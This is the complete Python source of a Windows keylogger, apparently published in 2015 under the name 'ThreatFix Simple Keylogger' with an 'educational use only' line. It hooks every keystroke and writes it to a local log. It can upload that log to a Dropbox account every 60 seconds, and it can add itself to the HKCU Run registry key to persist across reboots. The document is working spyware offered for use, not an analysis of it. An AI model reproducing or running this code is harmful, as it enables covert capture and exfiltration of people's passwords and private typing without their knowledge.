# ThreatFix Simple Keylogger - Windows/Python
# ThreatFix 2015
# http://threatfix.com
#
# This script performs the following functions:
#	1) Local - Tracks user input and saves input to local file (file path defined by user)
#	2) Dropbox - If selected, uploads log (path defined by user) every X seconds.
#
# The following are required for this keylogger to function:
# 	1) Python 2.7: https://www.python.org/download/releases/2.7/
#	2) dropbox-python-sdk: https://www.dropbox.com/developers-v1/core/sdks/python
# 	3) pyHook: http://sourceforge.net/projects/pyhook/
# 	4) pywin32: http://sourceforge.net/projects/pywin32/
#	
# This script is for educational use only. Be good pls.
# Feel free to manipulate and improve on this. Send us your updates and we'll post them.
# Original concept by: Ajin Abraham

import os
import sys
import threading
from _winreg import *
try:
    import dropbox, pythoncom, pyHook, win32event, win32api, winerror
except:
    print ("\n\nThreatFix Simple Keylogger\n--------------------------------\nNote: Execution failed. You must install Python modules: dropbox, pywin32, pythoncom, and pyHook. See Readme for Links.\n")
    exit(0)

# *****************************************************************************
#                   ENTER YOUR DROP BOX API KEY BELOW
# *****************************************************************************
dropBoxKey = "API KEY HERE"
# *****************************************************************************

# Generates the "readme" message to the user. Typically when an error occurs.
def introMessage():
    print """
*****************************************************
    ThreatFix Simple Keylogger - Windows/Python
                ThreatFix.com
*****************************************************

------
Usage
------
ThreatFix_Simple_Keylogger.py [Local|DropBox] [Filepath] [Optional:Persistent]\n
Ex: ThreatFix_Simple_Keylogger.py Local %AppData% Persistent\n
-Local: Store keystrokes on the host. [Filepath\ThreatFix_Keylogger_Log.txt]
-DropBox: Store keystrokes on the host. [Filepath\ThreatFix_Keylogger_Log.txt]
    -Uploads the file to DropBox every 60 seconds after keystroke.
    -Note: Must provide DropBox API key, edit variable in script.
-Persistent:[Optional] Add keylogger to Windows registry runkeys.
    """
    return True

# Local - Stores log on host
def local():
    global keys
    filePath = open(pathArg + "\ThreatFix_Keylogger_Log.txt", "a")
    filePath.write(keys)
    filePath.close()
    keys = ''


# Remote - Upload local file to Dropbox
def dbox():
    global dropBoxKey, threadCount

    client = dropbox.client.DropboxClient(dropBoxKey)
    filePath = open(pathArg + "\ThreatFix_Keylogger_Log.txt", "rb")
    client.put_file('ThreatFix_Keylogger_Log.txt', filePath, overwrite=True)
    threadCount = 0
	
# Add to Windows Runkeys
def runKey():
    filePath = os.path.dirname(os.path.realpath(__file__))
    fileName = sys.argv[0].split("\\")[-1]
    regKeyValue = "python.exe " + filePath + "\\" + fileName + " " + functionArg + " " + pathArg
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
                         keyVal, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "ThreatFix_Simple_Keylogger", 0, REG_SZ, regKeyValue)

# Checks the path input by the user and verifies that it is valid
def pathCheck():
    global pathArg
    try:
        filePath = open(pathArg + "\ThreatFix_Keylogger_Log.txt", "w+")
    except:
        introMessage()
        print ("\nNote: Execution failed. Cannot save Keylogger. Choose a different path.\n")
        exit(0)

# Checks the arguments input by the user and verifys that they are valid
def argChecks():
    global functionArg, functionSelect, pathArg, regArg

    try:
        functionArg = sys.argv[1].lower()
    except:
        introMessage()
        print ("\nNote: Execution failed. You must enter a function: (Local|Dropbox)\n")
        exit(0)

    try:
        pathArg = sys.argv[2].lower()
    except:
        introMessage()
        print ("\nNote: Execution failed. You must enter a destination log path: (Ex: %Appdata%)\n")
        exit(0)

    if len(sys.argv) > 3:
        regArg = sys.argv[3].lower()
    else:
        pass

    if functionArg == "local":
        functionSelect = 1
    if functionArg == "dropbox":
        functionSelect = 2
    if len(sys.argv) > 3:
        if regArg == "persistent":
            functionSelect = 3

    return True


# Application Main Module, Execution Starts Here
def main():
    global functionSelect, threadCount, functionArg, pathArg, regArg, keys
    keys = ''
    functionSelect = ''
    threadCount = 0
    argChecks()
    pathCheck()


if __name__ == '__main__':
    
    mutex = win32event.CreateMutex(None, 1, 'ThreatFix_Simple_Keylogger')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        introMessage()
        mutex = None
        print("*****************************************************\nNote: Execution failed. Keylogger already running.\n*****************************************************")
        exit(0)     
    main()

#  Collects the keystroke events and calls the logging functions
def onKeyboardEvent(event):
    global functionSelect, keys, threadCount

    if event.Ascii == 8:
        keys = '[BackSpace]'
    elif event.Ascii == 9:
        keys = '[Tab]'
    elif event.Ascii == 13:
        keys = '[Enter]'
    elif event.Ascii == 32:
        keys = '[Space]'
    else:
        keys = chr(event.Ascii)

    print keys

    if functionSelect == 1:
        local()
    elif functionSelect == 2:
        local()
        if threadCount == 0:
            threading.Timer(60, dbox).start()
            threadCount = 1
    elif functionSelect == 3:
        runKey()

keyBoardHook = pyHook.HookManager()
keyBoardHook.KeyDown = onKeyboardEvent
keyBoardHook.HookKeyboard()
pythoncom.PumpMessages()
